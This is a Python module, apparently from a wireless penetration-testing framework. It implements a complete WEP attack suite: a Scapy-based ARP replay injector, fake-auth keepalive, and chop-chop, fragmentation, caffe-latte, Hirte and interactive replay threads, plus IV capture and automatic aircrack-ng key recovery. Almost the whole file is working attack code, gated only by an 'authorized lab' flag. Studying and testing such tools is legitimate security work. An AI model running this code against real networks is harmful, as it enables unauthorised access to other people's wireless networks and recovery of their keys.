def _arp_replay_scapy(iface: str, bssid: str, count: int = 1000) -> int:
    """Perform a bounded ARP replay attack via Scapy.

    Captures one WEP-encrypted ARP frame from the target AP and replays it
    count times to force the AP to generate new IVs. Use _arp_replay_loop
    for continuous threaded replay.

    ARP frames inside WEP have a characteristic encrypted payload of 32 to
    54 bytes (28-byte ARP + 4-byte ICV, plus WEP overhead).

    Replaces aireplay-ng -3 (ARP replay, bounded run).

    Args:
        iface: Monitor-mode interface with injection capability.
        bssid: Target AP BSSID.
        count: Number of replay injections.

    Returns:
        Number of frames successfully injected.
    """
    # REFACTORED: removido aireplay-ng -3 - substituido por implementacao nativa Scapy
    bssid_lower = bssid.lower()
    arp_frames: list[object] = []

    def _find_arp(pkt) -> None:
        if len(arp_frames) >= 1:
            return
        if not pkt.haslayer(Dot11WEP):
            return
        dot11 = pkt.getlayer(Dot11)
        if dot11 is None or (dot11.addr3 or "").lower() != bssid_lower:
            return
        wepdata = bytes(getattr(pkt[Dot11WEP], "wepdata", b"") or b"")
        if 32 <= len(wepdata) <= 54:
            arp_frames.append(pkt)

    sniff(
        iface=iface,
        prn=_find_arp,
        timeout=30,
        stop_filter=lambda _: len(arp_frames) >= 1,
        store=False,
    )

    if not arp_frames:
        logger.info("ARP replay (bounded): no suitable ARP frame captured within 30s")
        return 0

    injected = 0
    for _ in range(count):
        try:
            sendp(arp_frames[0], iface=iface, verbose=False)
            injected += 1
        except Exception as exc:
            logger.debug("ARP replay injection error: %s", exc)
            break

    logger.info("ARP replay (bounded): injected %d frames", injected)
    return injected


@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    """Orchestrate all WEP attack vectors with automatic IV capture and cracking."""

    __info__ = {
        "name": "WEP Complete Attack Suite",
        "description": (
            "Orchestrates WEP attack modes (ARP replay, chop-chop, fragmentation, "
            "caffe-latte, Hirte, interactive/P0841) using native Python/Scapy for "
            "IV capture and frame injection. Auto-triggers aircrack-ng when the IV "
            "threshold is reached. Supports PTW (fast, 60k IVs) and FMS/KoreK "
            "(classic, 250k+ IVs) crack strategies."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
            "aircrack-ng team (GPL-2.0, invoked for final crack step only)",
        ),
        "references": (
            "https://www.aircrack-ng.org/doku.php?id=simple_wep_crack",
            "https://www.aircrack-ng.org/doku.php?id=aireplay-ng",
        ),
        "devices": ("wifi", "802.11 WEP"),
    }

    interface = OptString("", "Monitor-mode interface (e.g., wlan0mon)")
    bssid = OptString("", "Target AP BSSID")
    essid = OptString("", "Target AP ESSID (optional but recommended)")
    channel = OptInteger(0, "AP channel (required)")
    output_prefix = OptString("wep_capture", "File prefix for capture output")

    attack_arp_replay = OptBool(True, "Enable ARP replay attack (-3)")
    attack_chopchop = OptBool(True, "Enable chop-chop attack (-4)")
    attack_fragment = OptBool(True, "Enable fragmentation attack (-5)")
    attack_caffe_latte = OptBool(False, "Enable caffe-latte attack (-6, client-side)")
    attack_hirte = OptBool(False, "Enable Hirte CFrag attack (-7, client-side)")
    attack_interactive = OptBool(False, "Enable interactive/P0841 attack (-2)")

    inject_source_mac = OptString("", "Source MAC for injection; empty = auto from interface")
    fakeauth_keepalive = OptBool(True, "Maintain fake-auth association")
    crack_at_ivs = OptInteger(15000, "Start cracking when IVs reach this count")
    crack_interval_s = OptInteger(60, "Seconds between crack attempts")
    wep_keylen = OptInteger(0, "Expected WEP key bits (64/128/256); 0 = auto")
    max_time_s = OptInteger(1800, "Maximum total attack time in seconds (0 = unlimited)")

    dry_run = OptBool(False, "Print commands without executing")
    # REFACTORED: removido airodump-ng - captura e injecao nativos via Scapy
    native_mode = OptBool(True, "Use native Scapy for all IV capture and frame injection")
    i_know_scope = OptBool(False, "Confirm authorized lab environment")

    def _require_aircrack(self) -> str | None:
        """Locate the aircrack-ng binary on the system PATH.

        Returns:
            Absolute path to aircrack-ng, or None if not found.
        """
        path = _which("aircrack-ng")
        if not path:
            print_error("aircrack-ng not found. Install: apt install aircrack-ng")
        return path

    def _try_crack(self, aircrack_bin: str) -> bool:
        """Invoke aircrack-ng to attempt WEP key recovery on the current capture.

        Args:
            aircrack_bin: Absolute path to the aircrack-ng binary.

        Returns:
            True if the key was successfully recovered, False otherwise.
        """
        # ACCEPTED DEP: aircrack-ng e dependencia aceita no WXF
        cap = f"{str(self.output_prefix).strip()}-01.cap"
        if not os.path.isfile(cap):
            return False

        cmd = [aircrack_bin]
        bssid_val = str(self.bssid).strip()
        if bssid_val:
            cmd.extend(["-b", bssid_val])
        keylen = int(self.wep_keylen)
        if keylen > 0:
            cmd.extend(["-n", str(keylen)])
        cmd.append(cap)

        print_status("Attempting WEP crack with aircrack-ng...")
        try:
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=120,
            )
            output = result.stdout.decode("utf-8", errors="replace")
            if "KEY FOUND!" in output:
                for line in output.splitlines():
                    if "KEY FOUND!" in line:
                        print_success(line.strip())
                return True
            print_info("Key not found yet - continuing IV collection...")
        except subprocess.TimeoutExpired:
            print_status("Crack attempt timed out - continuing...")
        except FileNotFoundError:
            print_error("aircrack-ng disappeared from PATH.")
        return False

    def check(self) -> str:
        """Verify that the wireless interface is in monitor mode and ready."""
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return (
                        f"Interface {iface} found but NOT in Monitor mode - "
                        f"run airmon-ng start {iface}"
                    )
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return (
            f"Interface {iface} not found - connect wireless adapter and enable monitor mode"
        )

    def run(self) -> None:
        if not bool(self.i_know_scope):
            print_error("Set i_know_scope = true to confirm authorized lab.")
            return
        require_authorised_lab()

        if not SCAPY_AVAILABLE:
            print_error(
                "Scapy is required for native IV capture and injection. "
                "Install: pip install scapy"
            )
            return

        # ACCEPTED DEP: aircrack-ng e dependencia aceita no WXF
        aircrack = self._require_aircrack()
        if not aircrack:
            return

        iface = str(self.interface).strip()
        bssid = str(self.bssid).strip()
        ch = int(self.channel)
        prefix = str(self.output_prefix).strip()
        src_mac = str(self.inject_source_mac).strip() or _get_iface_mac(iface)
        ssid = str(self.essid).strip()

        if not iface or not bssid or ch <= 0:
            print_error("Set interface, bssid, and channel.")
            return

        if bool(self.dry_run):
            print_info(
                "[dry-run] Would start: Scapy IV sniffer + fake auth + "
                "WEP attack threads + aircrack-ng auto-crack"
            )
            return

        iv_list: list[tuple[bytes, bytes]] = []
        lock = threading.Lock()
        stop_event = threading.Event()
        cap_path = f"{prefix}-01.cap"

        try:
            pcap_writer = PcapWriter(cap_path, append=False, sync=True)
        except Exception as exc:
            print_error(f"Cannot open capture file {cap_path}: {exc}")
            return

        threads: list[tuple[str, threading.Thread]] = []

        # REFACTORED: substituido airodump-ng por implementacao nativa Scapy
        capture_thread = threading.Thread(
            target=_capture_ivs_scapy,
            args=(iface, bssid, stop_event, iv_list, pcap_writer, lock),
            daemon=True, name="scapy-iv-sniffer",
        )
        capture_thread.start()
        threads.append(("Scapy-IV-sniffer", capture_thread))
        print_status(f"Scapy IV sniffer started on {iface}")
        time.sleep(2)

        if bool(self.fakeauth_keepalive):
            # REFACTORED: substituido aireplay-ng -1 por implementacao nativa Scapy
            fa_thread = threading.Thread(
                target=_fake_auth_loop,
                args=(iface, bssid, src_mac, ssid, 30, stop_event),
                daemon=True, name="scapy-fakeauth",
            )
            fa_thread.start()
            threads.append(("Scapy-fakeauth", fa_thread))
            print_status(f"Fake-auth keepalive started (MAC: {src_mac})")
            time.sleep(1)

        if bool(self.attack_arp_replay):
            # REFACTORED: substituido aireplay-ng -3 por implementacao nativa Scapy
            arp_thread = threading.Thread(
                target=_arp_replay_loop,
                args=(iface, bssid, stop_event),
                daemon=True, name="scapy-arp-replay",
            )
            arp_thread.start()
            threads.append(("Scapy-ARP-replay", arp_thread))

        if bool(self.attack_chopchop):
            # REFACTORED: substituido aireplay-ng -4 por implementacao nativa Scapy
            cc_thread = threading.Thread(
                target=_chopchop_native,
                args=(iface, bssid, stop_event, 300),
                daemon=True, name="scapy-chopchop",
            )
            cc_thread.start()
            threads.append(("Scapy-chopchop", cc_thread))

        if bool(self.attack_fragment):
            # REFACTORED: substituido aireplay-ng -5 por implementacao nativa Scapy
            frag_thread = threading.Thread(
                target=_frag_attack_loop,
                args=(iface, bssid, stop_event),
                daemon=True, name="scapy-frag",
            )
            frag_thread.start()
            threads.append(("Scapy-frag", frag_thread))

        if bool(self.attack_caffe_latte):
            # REFACTORED: substituido aireplay-ng -6 por implementacao nativa Scapy
            cl_thread = threading.Thread(
                target=_caffe_latte_loop,
                args=(iface, bssid, stop_event),
                daemon=True, name="scapy-caffe-latte",
            )
            cl_thread.start()
            threads.append(("Scapy-caffe-latte", cl_thread))

        if bool(self.attack_hirte):
            # REFACTORED: substituido aireplay-ng -7 por implementacao nativa Scapy
            hirte_thread = threading.Thread(
                target=_hirte_loop,
                args=(iface, bssid, stop_event),
                daemon=True, name="scapy-hirte",
            )
            hirte_thread.start()
            threads.append(("Scapy-hirte", hirte_thread))

        if bool(self.attack_interactive):
            # REFACTORED: substituido aireplay-ng -2 por implementacao nativa Scapy
            ia_thread = threading.Thread(
                target=_interactive_replay_loop,
                args=(iface, bssid, stop_event),
                daemon=True, name="scapy-interactive",
            )
            ia_thread.start()
            threads.append(("Scapy-interactive", ia_thread))

        active_names = ", ".join(name for name, _ in threads)
        print_status(f"Active attack threads: {active_names}")

        start_time = time.time()
        max_t = int(self.max_time_s)
        threshold = int(self.crack_at_ivs)
        interval = int(self.crack_interval_s)
        cracked = False

        print_status(
            f"WEP attack running (native Scapy). "
            f"Crack threshold: {threshold} IVs. "
            f"Check every {interval}s. Max time: {max_t}s."
        )

        try:
            while True:
                elapsed = time.time() - start_time
                if max_t > 0 and elapsed >= max_t:
                    print_status(f"Max time ({max_t}s) reached.")
                    break

                with lock:
                    ivs = len(iv_list)
                print_info(f"[{int(elapsed)}s] IVs collected: {ivs}")

                if ivs >= threshold:
                    # ACCEPTED DEP: aircrack-ng e dependencia aceita no WXF
                    if self._try_crack(aircrack):
                        cracked = True
                        break

                time.sleep(min(interval, 15))

        except KeyboardInterrupt:
            print_status("Interrupted by user.")
        finally:
            stop_event.set()
            try:
                pcap_writer.close()
            except Exception:
                pass

        if cracked:
            print_success("WEP key recovered successfully!")
        else:
            print_info(
                f"Attack stopped. Captured IVs written to {cap_path}. "
                f"Manual crack: aircrack-ng -b {bssid} {cap_path}"
            )
